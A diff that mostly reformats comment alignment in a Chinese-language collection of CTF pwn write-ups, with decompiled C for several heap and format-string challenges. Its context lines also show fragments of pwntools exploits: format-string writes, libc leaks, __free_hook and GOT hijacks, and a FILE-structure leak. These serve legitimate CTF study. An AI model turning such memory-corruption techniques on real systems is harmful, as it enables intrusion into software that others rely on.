@@ -36,7 +36,7 @@ void __noreturn game()
       {
         if ( gd[i].v )
           printf("| %d | %-4s   | %3d |   %3d  |\n", i, gd[i].name, gd[i].v, gd[i].kk);
-      }                                         //      Welcome to my shop     
+      }                                         //      Welcome to my shop
                                                 // +===========================+
                                                 // | No|        | Sell| Recycle|
                                                 // +===+========+=====+========+
@@ -80,9 +80,9 @@ LABEL_17:
 ```C
 unsigned __int64 sale()
 {
-  int idx; // [rsp+Ch] [rbp-14h]
-  pthread_t newthread; // [rsp+10h] [rbp-10h] BYREF
-  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+  int idx;              // [rsp+Ch] [rbp-14h]
+  pthread_t newthread;  // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v3;  // [rsp+18h] [rbp-8h]
 
   v3 = __readfsqword(0x28u);
   printf("Which one?\n> ");
@@ -158,9 +158,9 @@ io.interactive()
 ```C
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
-  char buf[520]; // [rsp+10h] [rbp-210h] BYREF
-  unsigned __int64 v5; // [rsp+218h] [rbp-8h]
-  __int64 retaddr; // [rsp+228h] [rbp+8h]
+  char buf[520];        // [rsp+10h] [rbp-210h] BYREF
+  unsigned __int64 v5;  // [rsp+218h] [rbp-8h]
+  __int64 retaddr;      // [rsp+228h] [rbp+8h]
 
   v5 = __readfsqword(0x28u);
   ret = retaddr;
@@ -177,9 +177,9 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 ```C
 unsigned __int64 vuln()
 {
-  int v1; // [rsp+Ch] [rbp-34h]
-  char buf[40]; // [rsp+10h] [rbp-30h] BYREF
-  unsigned __int64 v3; // [rsp+38h] [rbp-8h]
+  int v1;               // [rsp+Ch] [rbp-34h]
+  char buf[40];         // [rsp+10h] [rbp-30h] BYREF
+  unsigned __int64 v3;  // [rsp+38h] [rbp-8h]
 
   v3 = __readfsqword(0x28u);
   printf("Please enter your name len:\n");
@@ -194,19 +194,19 @@ unsigned __int64 vuln()
 ```C
 int printf(const char *format, ...)
 {
-  __int64 v1; // rdx
-  __int64 v2; // rcx
-  __int64 v3; // rsi
-  __int64 v4; // r8
-  __int64 v5; // r9
-  int v7; // [rsp+1Ch] [rbp-D4h]
-  gcc_va_list arg; // [rsp+28h] [rbp-C8h] BYREF
-  __int64 v9; // [rsp+48h] [rbp-A8h]
-  __int64 v10; // [rsp+50h] [rbp-A0h]
-  __int64 v11; // [rsp+58h] [rbp-98h]
-  __int64 v12; // [rsp+60h] [rbp-90h]
-  __int64 v13; // [rsp+68h] [rbp-88h]
-  void *retaddr; // [rsp+F8h] [rbp+8h]
+  __int64 v1;       // rdx
+  __int64 v2;       // rcx
+  __int64 v3;       // rsi
+  __int64 v4;       // r8
+  __int64 v5;       // r9
+  int v7;           // [rsp+1Ch] [rbp-D4h]
+  gcc_va_list arg;  // [rsp+28h] [rbp-C8h] BYREF
+  __int64 v9;       // [rsp+48h] [rbp-A8h]
+  __int64 v10;      // [rsp+50h] [rbp-A0h]
+  __int64 v11;      // [rsp+58h] [rbp-98h]
+  __int64 v12;      // [rsp+60h] [rbp-90h]
+  __int64 v13;      // [rsp+68h] [rbp-88h]
+  void *retaddr;    // [rsp+F8h] [rbp+8h]
 
   va_start(arg, format);
   v3 = va_arg(arg, _QWORD);
@@ -360,9 +360,9 @@ io.interactive()
 ```C
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
-  char buf[520]; // [rsp+10h] [rbp-210h] BYREF
-  unsigned __int64 v5; // [rsp+218h] [rbp-8h]
-  __int64 retaddr; // [rsp+228h] [rbp+8h]
+  char buf[520];        // [rsp+10h] [rbp-210h] BYREF
+  unsigned __int64 v5;  // [rsp+218h] [rbp-8h]
+  __int64 retaddr;      // [rsp+228h] [rbp+8h]
 
   v5 = __readfsqword(0x28u);
   ret = retaddr;
@@ -488,7 +488,7 @@ payload += b'%'+str(system5).encode() + b'c%40$hhn'
 payload += b'%'+str(system6).encode() + b'c%41$hhn'
 payload += b'%'+str(0x40 + 0x100 - _system6).encode() + b'c%42$hhn'
 payload += b'%43$hhn'
-payload += b'%'+str(0x10).encode() + b'c%44$hhn'    
+payload += b'%'+str(0x10).encode() + b'c%44$hhn'
 payload += b'%'+str(0xfa-0x50).encode() + b'c%45$hhn'
 
 payload += b'%'+str(_rdi1 + 0x100 - 0xfa).encode() + b'c%46$hhn'
@@ -521,17 +521,17 @@ io.interactive()
 ```C
 __int64 __fastcall main(char *a1, char **a2, char **a3)
 {
-    char *ptr; // [rsp+8h] [rbp-8h]
+    char *ptr;   // [rsp+8h] [rbp-8h]
 
     ptr = init_0();
     while (1)
     {
-        menu(); //   puts("1. Allocate");
-                //   puts("2. Fill");
-                //   puts("3. Free");
-                //   puts("4. Dump");
-                //   puts("5. Exit");
-                //   return printf("Command: ");
+        menu();  //   puts("1. Allocate");
+                 //   puts("2. Fill");
+                 //   puts("3. Free");
+                 //   puts("4. Dump");
+                 //   puts("5. Exit");
+                 //   return printf("Command: ");
         switch (getc())
         {
         case 1LL:
@@ -559,9 +559,9 @@ __int64 __fastcall main(char *a1, char **a2, char **a3)
 ```C
 unsigned __int64 __fastcall edit(book *arr)
 {
-  unsigned __int64 t; // rax
-  int idx; // [rsp+18h] [rbp-8h]
-  int size; // [rsp+1Ch] [rbp-4h]
+  unsigned __int64 t;  // rax
+  int idx;             // [rsp+18h] [rbp-8h]
+  int size;            // [rsp+1Ch] [rbp-4h]
 
   printf("Index: ");
   t = getc();
@@ -687,9 +687,9 @@ io.interactive()
 ```C
 int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 {
-    int v3;              // eax
-    char buf[8];         // [rsp+0h] [rbp-10h] BYREF
-    unsigned __int64 v5; // [rsp+8h] [rbp-8h]
+    int v3;               // eax
+    char buf[8];          // [rsp+0h] [rbp-10h] BYREF
+    unsigned __int64 v5;  // [rsp+8h] [rbp-8h]
 
     v5 = __readfsqword(0x28u);
     setvbuf(stdout, 0LL, 2, 0LL);
@@ -698,15 +698,15 @@ int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
     {
         while (1)
         {
-            menu(); //   puts("--------------------------------");
-                    //   puts("       Easy Heap Creator       ");
-                    //   puts("--------------------------------");
-                    //   puts(" 1. Create a Heap               ");
-                    //   puts(" 2. Edit a Heap                 ");
-                    //   puts(" 3. Delete a Heap               ");
-                    //   puts(" 4. Exit                        ");
-                    //   puts("--------------------------------");
-                    //   return printf("Your choice :");
+            menu();       //   puts("--------------------------------");
+                          //   puts("       Easy Heap Creator       ");
+                          //   puts("--------------------------------");
+                          //   puts(" 1. Create a Heap               ");
+                          //   puts(" 2. Edit a Heap                 ");
+                          //   puts(" 3. Delete a Heap               ");
+                          //   puts(" 4. Exit                        ");
+                          //   puts("--------------------------------");
+                          //   return printf("Your choice :");
             read(0, buf, 8uLL);
             v3 = atoi(buf);
             if (v3 != 3)
@@ -753,10 +753,10 @@ int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 ```C
 unsigned __int64 edit_heap()
 {
-  unsigned int v1; // [rsp+4h] [rbp-1Ch]
-  __int64 v2; // [rsp+8h] [rbp-18h]
-  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
-  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+  unsigned int v1;      // [rsp+4h] [rbp-1Ch]
+  __int64 v2;           // [rsp+8h] [rbp-18h]
+  char buf[8];          // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v4;  // [rsp+18h] [rbp-8h]
 
   v4 = __readfsqword(0x28u);
   printf("Index :");
@@ -867,13 +867,13 @@ void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
   puts("======================");
   while ( 1 )
   {
-    menu();                                     //   v1 = __readfsqword(0x28u);
-                                                //   puts("1.Get a new chunk.");
-                                                //   puts("2.Delete a chunk.");
-                                                //   puts("3.Show a chunk.");
-                                                //   puts("4.Edit a chunk.");
-                                                //   puts("5.Exit.");
-                                                //   puts("What's your choice?");
+    menu();  //   v1 = __readfsqword(0x28u);
+             //   puts("1.Get a new chunk.");
+             //   puts("2.Delete a chunk.");
+             //   puts("3.Show a chunk.");
+             //   puts("4.Edit a chunk.");
+             //   puts("5.Exit.");
+             //   puts("What's your choice?");
     switch ( getc() )
     {
       case 1:
@@ -926,8 +926,8 @@ unsigned __int64 edit()
 ```C
 unsigned __int64 __fastcall bug(void *a1, int a2)
 {
-  int v3; // [rsp+14h] [rbp-Ch]
-  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+  int v3;               // [rsp+14h] [rbp-Ch]
+  unsigned __int64 v4;  // [rsp+18h] [rbp-8h]
 
   v4 = __readfsqword(0x28u);
   v3 = read(0, a1, a2);
@@ -936,7 +936,7 @@ unsigned __int64 __fastcall bug(void *a1, int a2)
     puts("Error");
     exit(-1);
   }
-  *(a1 + v3) = 0;                               // off-by-null
+  *(a1 + v3) = 0;       // off-by-null
   return __readfsqword(0x28u) ^ v4;
 }
 ```
@@ -1072,7 +1072,7 @@ io.interactive()
 ```C
 __int64 __fastcall main(int a1, char **a2, char **a3)
 {
-  int c; // [rsp+1Ch] [rbp-4h]
+  int c;         // [rsp+1Ch] [rbp-4h]
 
   setvbuf(stdout, 0LL, 2, 0LL);
   setvbuf(stdin, 0LL, 1, 0LL);
@@ -1080,13 +1080,13 @@ __int64 __fastcall main(int a1, char **a2, char **a3)
   rename();
   while ( 1 )
   {
-    c = getc();                                 //   puts("\n1. Create a book");
-                                                //   puts("2. Delete a book");
-                                                //   puts("3. Edit a book");
-                                                //   puts("4. Print book detail");
-                                                //   puts("5. Change current author name");
-                                                //   puts("6. Exit");
-                                                //   printf("> ");
+    c = getc();  //   puts("\n1. Create a book");
+                 //   puts("2. Delete a book");
+                 //   puts("3. Edit a book");
+                 //   puts("4. Print book detail");
+                 //   puts("5. Change current author name");
+                 //   puts("6. Exit");
+                 //   printf("> ");
     if ( c == 6 )
       break;
     switch ( c )
@@ -1261,7 +1261,7 @@ content = p64(3) + p64(heap+0x60) + p64(heap+0x60) + p64(0x20)
 edit(1, content)
 
 show()
-libc.address = u64(io.recvuntil(b'\x7f')[-6:] + b'\x00\x00') - 0x3c4b78   
+libc.address = u64(io.recvuntil(b'\x7f')[-6:] + b'\x00\x00') - 0x3c4b78
 info('libc: ' + hex(libc.address))
 free_hook = libc.sym['__free_hook']
 one_gadget = libc.address + 0x4526a
@@ -1281,16 +1281,15 @@ edit(3, p64(one_gadget))
 delete(3)
 
 io.interactive()
-
 ```
 
 #### hitcontraining_bamboobox
 ```C
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
-  func_list *lst; // [rsp+8h] [rbp-18h]
-  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
-  unsigned __int64 v6; // [rsp+18h] [rbp-8h]
+  func_list *lst;       // [rsp+8h] [rbp-18h]
+  char buf[8];          // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v6;  // [rsp+18h] [rbp-8h]
 
   v6 = __readfsqword(0x28u);
   setvbuf(stdout, 0LL, 2, 0LL);
@@ -1301,16 +1300,16 @@ int __fastcall main(int argc, const char **argv, const char **envp)
   lst->hello();
   while ( 1 )
   {
-    menu();                                     //   puts("----------------------------");
-                                                //   puts("Bamboobox Menu");
-                                                //   puts("----------------------------");
-                                                //   puts("1.show the items in the box");
-                                                //   puts("2.add a new item");
-                                                //   puts("3.change the item in the box");
-                                                //   puts("4.remove the item in the box");
-                                                //   puts("5.exit");
-                                                //   puts("----------------------------");
-                                                //   return printf("Your choice:");
+    menu();             //   puts("----------------------------");
+                        //   puts("Bamboobox Menu");
+                        //   puts("----------------------------");
+                        //   puts("1.show the items in the box");
+                        //   puts("2.add a new item");
+                        //   puts("3.change the item in the box");
+                        //   puts("4.remove the item in the box");
+                        //   puts("5.exit");
+                        //   puts("----------------------------");
+                        //   return printf("Your choice:");
     read(0, buf, 8uLL);
     switch ( atoi(buf) )
     {
@@ -1335,17 +1334,17 @@ int __fastcall main(int argc, const char **argv, const char **envp)
     }
   }
 }
-``` 
+```
 
 ##### 漏洞分析
 ```c
 unsigned __int64 change_item()
 {
-  int idx; // [rsp+4h] [rbp-2Ch]
-  int len; // [rsp+8h] [rbp-28h]
-  char buf[16]; // [rsp+10h] [rbp-20h] BYREF
-  char nptr[8]; // [rsp+20h] [rbp-10h] BYREF
-  unsigned __int64 v5; // [rsp+28h] [rbp-8h]
+  int idx;              // [rsp+4h] [rbp-2Ch]
+  int len;              // [rsp+8h] [rbp-28h]
+  char buf[16];         // [rsp+10h] [rbp-20h] BYREF
+  char nptr[8];         // [rsp+20h] [rbp-10h] BYREF
+  unsigned __int64 v5;  // [rsp+28h] [rbp-8h]
 
   v5 = __readfsqword(0x28u);
   if ( num )
@@ -1472,9 +1471,9 @@ io.interactive()
 ```C
 void __fastcall __noreturn main(char *a1, char **a2, char **a3)
 {
-  int v3; // eax
-  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
-  unsigned __int64 v5; // [rsp+28h] [rbp-8h]
+  int v3;               // eax
+  char buf[24];         // [rsp+10h] [rbp-20h] BYREF
+  unsigned __int64 v5;  // [rsp+28h] [rbp-8h]
 
   v5 = __readfsqword(0x28u);
   init_0();
@@ -1482,17 +1481,17 @@ void __fastcall __noreturn main(char *a1, char **a2, char **a3)
   {
     while ( 1 )
     {
-      menu();                                   //   puts("==============================");
-                                                //   puts(" This is a heap exploit demo  ");
-                                                //   puts("==============================");
-                                                //   puts("1. Create something           ");
-                                                //   puts("2. Delete something           ");
-                                                //   puts("3. Print something            ");
-                                                //   puts("4. Exit                       ");
-                                                //   puts("==============================");
-                                                //   printf("Now the time is ");
-                                                //   system("date");
-                                                //   printf("Your choice: ");
+      menu();           //   puts("==============================");
+                        //   puts(" This is a heap exploit demo  ");
+                        //   puts("==============================");
+                        //   puts("1. Create something           ");
+                        //   puts("2. Delete something           ");
+                        //   puts("3. Print something            ");
+                        //   puts("4. Exit                       ");
+                        //   puts("==============================");
+                        //   printf("Now the time is ");
+                        //   system("date");
+                        //   printf("Your choice: ");
       read(0, buf, 8uLL);
       v3 = atoi(buf);
       if ( v3 != 2 )
@@ -1516,9 +1515,9 @@ void __fastcall __noreturn main(char *a1, char **a2, char **a3)
 ```C
 unsigned __int64 del()
 {
-  int v1; // [rsp+Ch] [rbp-24h]
-  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
-  unsigned __int64 v3; // [rsp+28h] [rbp-8h]
+  int v1;                   // [rsp+Ch] [rbp-24h]
+  char buf[24];             // [rsp+10h] [rbp-20h] BYREF
+  unsigned __int64 v3;      // [rsp+28h] [rbp-8h]
 
   v3 = __readfsqword(0x28u);
   puts("Please input list index: ");
@@ -1528,7 +1527,7 @@ unsigned __int64 del()
   {
     if ( *(&arr + v1) )
     {
-      free(**(&arr + v1));                      // uaf
+      free(**(&arr + v1));  // uaf
       free(*(&arr + v1));
     }
   }
@@ -1541,8 +1540,7 @@ unsigned __int64 del()
 ```
 `free` 之后没有把指针置空，就是 UAF。
 
-而程序未开启 PIE, 还有 '/bin/sh' 字样
-直接通过劫持 print 为 system
+程序没开 PIE，里面还带着 `/bin/sh` 字样，直接劫持 `printf` 为 `system` 就行。
 
 ##### exp
 ```python
@@ -1639,9 +1637,9 @@ void __cdecl read_flag()
 ```C
 void __cdecl __noreturn vuln()
 {
-  int i; // [rsp+8h] [rbp-8h]
-  int ia; // [rsp+8h] [rbp-8h]
-  int index; // [rsp+Ch] [rbp-4h]
+  int i;                               // [rsp+8h] [rbp-8h]
+  int ia;                              // [rsp+8h] [rbp-8h]
+  int index;                           // [rsp+Ch] [rbp-4h]
 
   puts("Can you give me your feedback?");
   puts("There are some questions.");
@@ -1658,7 +1656,7 @@ void __cdecl __noreturn vuln()
     if ( index <= 3 )
     {
       puts("Then you can input your feedback.");
-      read_str(feedback_list[index]);           // 数组越界
+      read_str(feedback_list[index]);  // 数组越界
       print_feedback();
     }
     else
@@ -1683,7 +1681,7 @@ context.terminal = ['tmux', 'splitw', '-h']
 libc = ELF('./libc-2.31.so')
 
 io = process('./feedback')
-gdb.attach(io, 'b *$rebase(0x1581)')  
+gdb.attach(io, 'b *$rebase(0x1581)')
 
 def edit(idx, content):
     io.recvuntil(b'Which list do you want to write?')
@@ -1721,7 +1719,6 @@ payload = p64(0xfbad1800) + p64(0) * 3 + p64(base_addr)+p64(end_addr)+p64(0)*3
 edit(-8, payload)
 
 io.interactive()
-
 ```
 
 #### tcache_king
@@ -1730,18 +1727,18 @@ io.interactive()
 ```C
 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
 {
-  unsigned __int64 v3; // [rsp+8h] [rbp-8h]
+  unsigned __int64 v3;  // [rsp+8h] [rbp-8h]
 
   init_0(a1, a2, a3);
   while ( 1 )
   {
     while ( 1 )
     {
-      menu();                                   //   log("1.Add\n");
-                                                //   log("2.Edit\n");
-                                                //   log("3.Free\n");
-                                                //   log("4.Exit\n");
-                                                //   return write(1, ">> ", 3uLL);
+      menu();           //   log("1.Add\n");
+                        //   log("2.Edit\n");
+                        //   log("3.Free\n");
+                        //   log("4.Exit\n");
+                        //   return write(1, ">> ", 3uLL);
       v3 = (int)getc();
       if ( v3 != 2 )
         break;
@@ -1783,7 +1780,7 @@ void del()
   else
     log("Invalid idx\n");
 }
-``` 
+```
 明显的 UAF：把 chunk 申请到数组地址上，再劫持 GOT。沙箱禁了 `execve` 和 `execveat`，所以改打 ORW。
 
 ##### exp
@@ -1896,5 +1893,4 @@ io.sendline(payload)
 print(io.recvall())
 
 io.interactive()
-
 ```
